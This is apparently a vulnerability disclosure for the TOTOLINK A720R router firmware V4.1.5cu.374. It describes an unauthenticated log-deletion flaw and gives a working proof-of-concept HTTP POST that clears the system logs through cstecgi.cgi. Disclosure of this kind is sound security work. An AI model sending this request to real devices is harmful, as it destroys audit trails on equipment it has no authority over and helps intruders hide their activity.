# Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/203/ids/36.html

# Affected version

V4.1.5cu.374

# Vulnerability details

The TOTOLINK A720R V4.1.5cu.374 firmware contains an unauthorized system log deletion vulnerability. This vulnerability occurs when a POST request is sent to the `/cgi-bin/cstecgi.cgi` with the parameter `{"topicurl":"clearSyslog"}`, allowing an attacker to delete system logs without authentication.

# Poc

System logs are normally recorded.

![图 0](img/3d9d8506968579a012a15828056aea9b3e6130ab439529892e9683666af1cbf0.png)  

Send a request to clear the log.

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.140.79
Content-Length: 27
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.140.79
Referer: http://192.168.140.79/basic/index.html?time=1745238634622
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive

{"topicurl":"clearSyslog"}
```

![图 1](img/36c79fb69c0d189284dc6574725aa870d8202f80d72b5e1eef0d5ffb3a1e7edf.png)  

System logs have been cleared.

![图 2](img/8a2e9eedd5c7c1f192e8b2cdde51203ba9d3ac71fe13c7216a53b0a4ee07b4b9.png)  

